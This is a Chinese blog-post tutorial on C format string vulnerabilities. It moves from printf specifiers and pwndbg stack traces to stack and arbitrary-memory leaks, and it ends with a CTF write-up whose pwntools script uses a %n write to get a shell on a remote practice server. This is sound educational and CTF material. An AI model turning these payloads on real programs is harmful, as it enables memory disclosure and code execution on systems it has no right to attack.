<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8" />
  
  <title>格式化字符串漏洞 | 0ke</title>
  <meta name="author" content="lijianbo" />

  
  <meta name="description" content="格式化字符串" />
  

  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />

  <meta property="og:title" content="格式化字符串漏洞" />
  <meta property="og:site_name" content="0ke" />

  
  

  
    <meta property="og:image" content="" />
  

  
  <link href="/css/images/favicon.ico" rel="icon" />
  

  <link rel="alternate" href="/atom.xml" title="0ke" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  


  <!-- baidu webmaster push -->
  <script src='//push.zhanzhang.baidu.com/push.js'></script>

<meta name="generator" content="Hexo 6.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>


<body>
  <header id="header" class="inner"><div class="alignleft">
  <h1><a href="/">0ke</a></h1>
  <h2><a href="/">Something good must happen in the future</a></h2>
</div>
<nav id="main-nav" class="alignright">
  <ul>
    
      <li><a href="/">Home</a></li>
    
      <li><a href="/archives">Archives</a></li>
    
  </ul>
  <div class="clearfix"></div>
</nav>
<div class="clearfix"></div></header>
  <div id="content" class="inner">
    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2021-01-25T16:00:00.000Z"><a href="/2021/01/26/格式化字符串/">2021-01-26</a></time>
      
      
  
    <h1 class="title">格式化字符串漏洞</h1>
  

    </header>
    <div class="entry">
      
        <h1 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h1><span id="more"></span>

<h2 id="1-1-格式化输出函数"><a href="#1-1-格式化输出函数" class="headerlink" title="1.1 格式化输出函数"></a>1.1 格式化输出函数</h2><h3 id="1-1-1变参函数和格式转换"><a href="#1-1-1变参函数和格式转换" class="headerlink" title="1.1.1变参函数和格式转换"></a>1.1.1变参函数和格式转换</h3><p> 1.C语言中printf()就是一个变参函数，它有一个强制参数，即格式化字符串。</p>
<p><img src="/images/1.png"></p>
<p> 2.一些常见的转换指示符如下</p>
<p> ％d整型输出，％ld长整型输出，</p>
<p> %p指针变量地址，如果数处数据不够8位数，则左边补零</p>
<p> ％o以八进制数形式输出整数，</p>
<p> ％x以十六进制数形式输出整数，</p>
<p> ％u以十进制数输出unsigned型数据(无符号数)。</p>
<p> ％c用来输出一个字符，</p>
<p> ％s用来输出一个字符串，</p>
<p> ％f用来输出实数，以小数形式输出，</p>
<p> ％e以指数形式输出实数，</p>
<p> ％g根据大小自动选f格式或e格式，且不输出无意义的零。</p>
<p> 3.下面通过对printf()试验，来具体体会一下各种指示符的含义。注释部分为每条语句的输出结果。</p>
<pre><code>printf(&quot;Hello %%&quot;);                    //&quot;Hello %&quot;
printf(&quot;Hello world!&quot;);                //&quot;Hello world!&quot;
printf(&quot;Number:%d&quot;,123);               //&quot;Number:123&quot;
printf(&quot;%s %s&quot;,&quot;Format&quot;,&quot;Strings&quot;);    //&quot;Format Strings&quot;
printf(&quot;%12c&quot;,&#39;A&#39;);                    //&quot;            A&quot;
printf(&quot;%16s&quot;,&quot;Hello&quot;);                //&quot;           Hello&quot;

int n;
printf(&quot;%12c%n&quot;,&#39;A&#39;,&amp;n);               //n = 12
printf(&quot;%16s%n&quot;,&quot;Hello&quot;,&amp;n);           //n = 16

printf(&quot;%2$s %1$s&quot;,&quot;Format&quot;, &quot;Strings&quot;); //&quot;Strings Format&quot;
printf(&quot;%42c%1$n&quot;,&amp;n);                 //
</code></pre>
<h2 id="1-2-格式化字符串漏洞"><a href="#1-2-格式化字符串漏洞" class="headerlink" title="1.2 格式化字符串漏洞"></a>1.2 格式化字符串漏洞</h2><h3 id="1-2-1-基本原理"><a href="#1-2-1-基本原理" class="headerlink" title="1.2.1 基本原理"></a>1.2.1 基本原理</h3><p> 在x86架构下，格式字符串的参数是通过栈传递的，下面对一个简单的C代码进行试验。</p>
<pre><code>#include &lt;stdio.h&gt;
void main()&#123;
    printf(&quot;%s %d %s&quot;,&quot;Hello World!&quot;,233,&quot;\n&quot;);
&#125;
</code></pre>
<p> 将其编译程32位程序，并且观察参数的传递情况。</p>
<pre><code>lijianbo@ubuntu:~/Desktop$ gcc -m32 fmtdemo.c -o fmtdemo -g
lijianbo@ubuntu:~/Desktop$ ./fmtdemo
Hello World! 233 
...
pwndbg&gt; b printf
Breakpoint 1 at 0x80482e0
pwndbg&gt; r
...
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ esp  0xffffcf1c —▸ 0x8048435 (main+42) ◂— add    esp, 0x10
01:0004│      0xffffcf20 —▸ 0x80484df ◂— and    eax, 0x64252073 /* &#39;%s %d %s&#39; */
02:0008│      0xffffcf24 —▸ 0x80484d2 ◂— dec    eax /* &#39;Hello World!&#39; */
03:000c│      0xffffcf28 ◂— 0xe9
04:0010│      0xffffcf2c —▸ 0x80484d0 ◂— or     al, byte ptr [eax] /* &#39;\n&#39; */
</code></pre>
<p> 在进入printf()函数之前，程序将参数从右到左依次压栈。进入printf()之后，函数首先获取第一个参数，一次读取一个字符。如果字符不是“%”，那么字符被直接复制到输出。否则读取下一个非空字符，获取相应的参数并解析输出。</p>
<p> 在原来程序的格式化字符串位置加上“%x %x %x %3$x”，使它出现格式化字符串漏洞。</p>
<pre><code>#include &lt;stdio.h&gt;
void main()&#123;
    printf(&quot;%s %d %s %x %x %x %3$s&quot;,&quot;Hello World!&quot;,233,&quot;\n&quot;);
&#125;
...
lijianbo@ubuntu:~/Desktop$ gcc -m32 fmtdemo.c -o fmtdemo -g
fmtdemo.c: In function ‘main’:
fmtdemo.c:3:12: warning: format ‘%x’ expects a matching ‘unsigned int’ argument [-Wformat=]
     printf(&quot;%s %d %s %x %x %x %3$s&quot;,&quot;Hello World!&quot;,233,&quot;\n&quot;);
            ^
fmtdemo.c:3:12: warning: format ‘%x’ expects a matching ‘unsigned int’ argument [-Wformat=]
fmtdemo.c:3:12: warning: format ‘%x’ expects a matching ‘unsigned int’ argument [-Wformat=]
fmtdemo.c:3:5: warning: $ operand number used after format without operand number [-Wformat=]
     printf(&quot;%s %d %s %x %x %x %3$s&quot;,&quot;Hello World!&quot;,233,&quot;\n&quot;);
     ^
</code></pre>
<p> 可以看到，当格式化字符的数量大于实际参数时，编译器会提示这个地方危险，但是程序仍然会被编译出来。</p>
<pre><code>───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ esp  0xffffcf1c —▸ 0x8048435 (main+42) ◂— add    esp, 0x10
01:0004│      0xffffcf20 —▸ 0x80484df ◂— and    eax, 0x64252073 /* &#39;%s %d %s %x %x %x %3$s&#39; */
02:0008│      0xffffcf24 —▸ 0x80484d2 ◂— dec    eax /* &#39;Hello World!&#39; */
03:000c│      0xffffcf28 ◂— 0xe9
04:0010│      0xffffcf2c —▸ 0x80484d0 ◂— or     al, byte ptr [eax] /* &#39;\n&#39; */
05:0014│      0xffffcf30 —▸ 0xf7fb53dc (__exit_funcs) —▸ 0xf7fb61e0 (initial) ◂— 0x0
06:0018│      0xffffcf34 —▸ 0xffffcf50 ◂— 0x1
07:001c│ ebp  0xffffcf38 ◂— 0x0
pwndbg&gt; c
Continuing.
Hello World! 233 
 f7fb53dc ffffcf50 0
</code></pre>
<p> 程序打印了七个值（包括换行），实际上参数只有三个，所以后面的三个“%x”打印的是0xffffcf30-0xffffcf38的数据，而最后一个参数“%3$s”是表示第三个参数的重用，也就是“\n”。</p>
<p> 下面对一个省去格式化字符串的程序进行试验。</p>
<pre><code>#include &lt;stdio.h&gt;
void main()&#123;
    char buf[50];
    if(fgets(buf,sizeof buf,stdin)==NULL)
        return;
    printf(buf);
&#125;
...
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ esp    0xffffcedc —▸ 0x80484fe (main+67) ◂— add    esp, 0x10
01:0004│        0xffffcee0 —▸ 0xffffcefa ◂— &#39;Hello %x %x %x\n&#39;
02:0008│        0xffffcee4 ◂— 0x32 /* &#39;2&#39; */
03:000c│        0xffffcee8 —▸ 0xf7fb55a0 (_IO_2_1_stdin_) ◂— 0xfbad2288
04:0010│        0xffffceec ◂— 0x9017
...
pwndbg&gt; c
Continuing.
Hello 32 f7fb55a0 9017
</code></pre>
<p> 如果只是输入Hello，程序将不会出现问题，但是如果在buf中输入一些转换指示符，那么printf()就会把它当成格式化字符串进行解析，出现漏洞。例如上面的例子，输入“Hello %x %x %x”程序就会吧栈数据泄露出来。</p>
<p> <strong>综上：格式字符串漏洞的发生条件是格式化字符串要求的参数和实际提供的参数不匹配。</strong></p>
<h3 id="1-2-2漏洞利用"><a href="#1-2-2漏洞利用" class="headerlink" title="1.2.2漏洞利用"></a>1.2.2漏洞利用</h3><p> 漏洞利用主要有：使程序崩溃、栈数据泄露、任意地址内存泄露、栈数据覆盖、任意地址内存覆盖。</p>
<h4 id="使程序崩溃"><a href="#使程序崩溃" class="headerlink" title="使程序崩溃"></a>使程序崩溃</h4><p> 通常用类似下面的格式字符串即可出发程序崩溃。原因有三点：（1）对于每个“%s”，<strong>printf()函数都要从栈中获取一个数字，将其视为一个地址，然后打印出地址所指向的内存。</strong>直到出现一个空字符；（2）获取的某个数字可能并不是一个地址；（3）获得的数字确实 是一个地址，但该地址是受到系统保护的。</p>
<pre><code>printf(&quot;%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s&quot;)
</code></pre>
<h4 id="栈数据泄露"><a href="#栈数据泄露" class="headerlink" title="栈数据泄露"></a>栈数据泄露</h4><p> 程序崩溃只是检验漏洞的第一步，还可以使用格式化函数获得内存数据，为漏洞利用做准备。格式化函数会根据格式字符串从栈上取值，x86程序的栈是由高地址向低地址增长。同时printf()函数的参数是以逆序被压入栈的，所以参数在内存中的出现顺序与在printf()调用时出现的顺序是一样的。</p>
<p> 利用如下代码进行演示。</p>
<pre><code>#include &lt;stdio.h&gt;
void main()&#123;
    char format[128];
    int arg1 = 1, arg2 = 0x8888888, arg3 = -1;
    char arg4[10]=&quot;ABCD&quot;;
    scanf(&quot;%s&quot;,format);
    printf(format, arg1, arg2, arg3, arg4);
    printf(&quot;\n&quot;);
&#125;
...
lijianbo@ubuntu:~/Desktop$ gcc -m32 -fno-stack-protector -no-pie fmtdemo.c -o fmtdemo
lijianbo@ubuntu:~/Desktop$ gdb fmtdemo
...
pwndbg&gt; b printf
Breakpoint 1 at 0x8048350
pwndbg&gt; r
Starting program: /home/lijianbo/Desktop/fmtdemo 
%08x.%08x.%08x.%08x.%08x
...
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ esp  0xffffce6c —▸ 0x8048517 (main+124) ◂— add    esp, 0x20
01:0004│      0xffffce70 —▸ 0xffffcea4 ◂— &#39;%08x.%08x.%08x.%08x.%08x&#39;
02:0008│      0xffffce74 ◂— 0x1
03:000c│      0xffffce78 ◂— 0x8888888
04:0010│      0xffffce7c ◂— 0xffffffff
05:0014│      0xffffce80 —▸ 0xffffce9a ◂— &#39;ABCD&#39;
06:0018│      0xffffce84 —▸ 0xffffcea4 ◂— &#39;%08x.%08x.%08x.%08x.%08x&#39;
...
pwndbg&gt; c
Continuing.
00000001.08888888.ffffffff.ffffce9a.ffffcea4
</code></pre>
<p> ok，可以看到格式化字符串地址0xffffcea4位于参数之前。</p>
<p> 接下来尝试泄露指定的某个数据。</p>
<pre><code>%3$x.%1$08x.%2$p.%4$p.%5$p.%6$p
...
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ esp  0xffffce6c —▸ 0x8048517 (main+124) ◂— add    esp, 0x20
01:0004│      0xffffce70 —▸ 0xffffcea4 ◂— &#39;%3$x.%1$08x.%2$p.%4$p.%5$p.%6$p&#39;
02:0008│      0xffffce74 ◂— 0x1
03:000c│      0xffffce78 ◂— 0x8888888
04:0010│      0xffffce7c ◂— 0xffffffff
05:0014│      0xffffce80 —▸ 0xffffce9a ◂— &#39;ABCD&#39;
06:0018│      0xffffce84 —▸ 0xffffcea4 ◂— &#39;%3$x.%1$08x.%2$p.%4$p.%5$p.%6$p&#39;
07:001c│      0xffffce88 —▸ 0x80481fc ◂— cmp    byte ptr [eax], al /* &#39;8&#39; */
...
pwndbg&gt; c
Continuing.
ffffffff.00000001.0x8888888.0xffffce9a.0xffffcea4.0x80481fc
</code></pre>
<p> 5和6表示位于格式化字符串<strong>后</strong>的第5和第6个参数，通过上述内容可以看出。</p>
<h4 id="任意地址内存泄露"><a href="#任意地址内存泄露" class="headerlink" title="任意地址内存泄露"></a>任意地址内存泄露</h4><p> 如果我们能够操控某个参数的值，那么就可以泄露任意地址内容。仍以上一个C程序为例，当输入“%4$s”时，输出的arg4变成了“ABCD”而非地址。</p>
<pre><code>01:0004│      0xffffce70 —▸ 0xffffcea4 ◂— &#39;%4$s&#39;
02:0008│      0xffffce74 ◂— 0x1
03:000c│      0xffffce78 ◂— 0x8888888
04:0010│      0xffffce7c ◂— 0xffffffff
05:0014│      0xffffce80 —▸ 0xffffce9a ◂— &#39;ABCD&#39;
...
pwndbg&gt; c
Continuing.
ABCD
</code></pre>
<p> 尝试获取任意内存的数据，此时需要手动将地址写入栈中。输入“AAAA.%p”的格式化字符串。</p>
<pre><code>pwndbg&gt; x/20wx $esp
0xffffce6c:	0x08048517	0xffffcea4	0x00000001	0x08888888
0xffffce7c:	0xffffffff	0xffffce9a	0xffffcea4	0x080481fc
0xffffce8c:	0xffffcef8	0xf7ffda74	0x00000001	0x424134a0
0xffffce9c:	0x00004443	0x00000000	0x41414141	0x2e70252e
0xffffceac:	0x252e7025	0x70252e70	0x2e70252e	0x252e7025
pwndbg&gt; c
Continuing.
AAAA.0x1.0x8888888.0xffffffff.0xffffce9a.0xffffcea4.0x80481fc.0xffffcef8.0xf7ffda74.0x1.0x424134a0.0x4443.(nil).0x41414141.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e
</code></pre>
<p> ok，“0x41414141”是打印的第13个字符，所以利用“%13$s”就可以读出0x41414141所指向的内存。我们将0x41414141换成ABCD的地址0xffffce9a。</p>
<pre><code>lijianbo@ubuntu:~/Desktop$ python -c &#39;print(&quot;\x9a\xce\xff\xff&quot;+&quot;.%13$s&quot;)&#39;&gt;text
...
pwndbg&gt; r &lt; ./text
pwndbg&gt; b printf
pwndbg&gt; r
...
pwndbg&gt; x/20wx $esp
0xffffce6c:	0x08048517	0xffffcea4	0x00000001	0x08888888
0xffffce7c:	0xffffffff	0xffffce9a	0xffffcea4	0x080481fc
0xffffce8c:	0xffffcef8	0xf7ffda74	0x00000001	0x424134a0
0xffffce9c:	0x00004443	0x00000000	0xffffce9a	0x3331252e
0xffffceac:	0x00007324	0xffffceee	0x00000001	0x000000c2
pwndbg&gt; c
Continuing.
����.ABCD
</code></pre>
<p> 于是就打印出了字符串“ABCD”。在漏洞利用中，<strong>可以利用这种方法，把某函数的GOT地址传进去，从而获得所对应函数的虚拟地址。然后根据libc中的相对位置，就可以计算出任意函数地址，例如system()。</strong></p>
<h4 id="任意地址内存覆盖"><a href="#任意地址内存覆盖" class="headerlink" title="任意地址内存覆盖"></a>任意地址内存覆盖</h4><pre><code>     这部分书上的内容在实际实现时出现了一些问题，因为书上使用的gdb插件是gef，我经常用的是pwndbg，使用上可能有一些差异，目前正在解决，当实际解决之后补充完善这部分理论内容。所以先利用一道题目辅助理解。
</code></pre>
<p>​		解决了，代码不挂了。问题出在了printf()前后，不是插件问题。</p>
<h4 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h4><p> 题目来自buuctf的第九道pwn题。</p>
<p> 首先checksec文件。</p>
<pre><code>lijianbo@ubuntu:~/Desktop$ checksec buupwn9
[*] &#39;/home/lijianbo/Desktop/buupwn9&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>
<p> 拖入32位ida，F5观察代码逻辑。</p>
<p><img src="/images/2.png"></p>
<p> 通过观察可以得知，其中printf（&amp;buf）处存在格式化字符串漏洞。</p>
<p> 利用思路：可以通过格式化字符串漏洞篡改unk_804c044的值为4触发if。为什么篡改的值为4呢？这里有必要了解一下atoi，他是将参数所指向的字符串转换为一个整数（类型为 int 型）。</p>
<p> 运行程序输入AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x</p>
<pre><code>lijianbo@ubuntu:~/Desktop$ ./buupwn9
your name:AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
Hello,AAAA.ffee0c08.63.0.ffee0c2e.3.c2.f7dba79b.ffee0c2e.ffee0d2c.41414141.2e78252e
your passwd:
</code></pre>
<p> 查数到41414141，偏移量是10，利用IDA找一下unk_804c044的地址是：0x804C044。真是耿直呢。</p>
<p> 解题代码如下。</p>
<pre><code>from pwn import *
p = remote(&#39;node3.buuoj.cn&#39;,27523)
#p = process(&#39;./buupwn9&#39;)
addr = 0x804C044
payload = p32(addr)
payload += &quot;%10$n&quot;
p.sendline(payload)
p.sendline(str(0x4))
p.interactive()
...
lijianbo@ubuntu:~/Desktop$ python buupwn9.py
[+] Opening connection to node3.buuoj.cn on port 27523: Done
[*] Switching to interactive mode
your name:Hello,D�
����� &lt;�\xffR\x83\x04your ok!!
$ ls
bin
boot
dev
etc
flag
</code></pre>

      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



</div></div>
    <aside id="sidebar" class="alignright">
  <div class="search">
  <form action="//google.com/search" method="get" accept-charset="utf-8">
    <input type="search" name="q" results="0" placeholder="搜索">
    <input type="hidden" name="q" value="site:0ke.github.io">
  </form>
</div>

  

  
<div class="widget tag">
  <h3 class="title">最新文章</h3>
  <ul class="entry">
    
      <li>
        <a href="/2022/04/19/驱动过滤-串口过滤/">驱动过滤--串口过滤</a>
      </li>
    
      <li>
        <a href="/2021/11/10/主动防御系统说明/">主动防御系统说明</a>
      </li>
    
      <li>
        <a href="/2021/10/26/基于MFC的驱动加载工具/">基于MFC的驱动加载工具</a>
      </li>
    
      <li>
        <a href="/2021/10/09/windows核心编程/">windows核心编程</a>
      </li>
    
      <li>
        <a href="/2021/09/15/逆向/">逆向</a>
      </li>
    
  </ul>
</div>


  
<div class="widget tag">
  <h3 class="title">标签</h3>
  <ul class="entry">
  
    <li><a href="/tags/随笔/">随笔</a><small>1</small></li>
  
  </ul>
</div>


  
<div class="widget tagcloud">
  <h3 class="title">标签云</h3>
  <div class="entry">
    <a href="/tags/%E9%9A%8F%E7%AC%94/" style="font-size: 10px;">随笔</a>
  </div>
</div>

</aside>
    <div class="clearfix"></div>
  </div>
  <footer id="footer" class="inner"><div class="alignleft">
  <p>
  
  &copy; 2022 lijianbo
  
  All rights reserved.</p>
  <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
</div>
<div class="clearfix"></div>

<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script></footer>
  <script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>


<div id='bg'></div>
</body>
</html>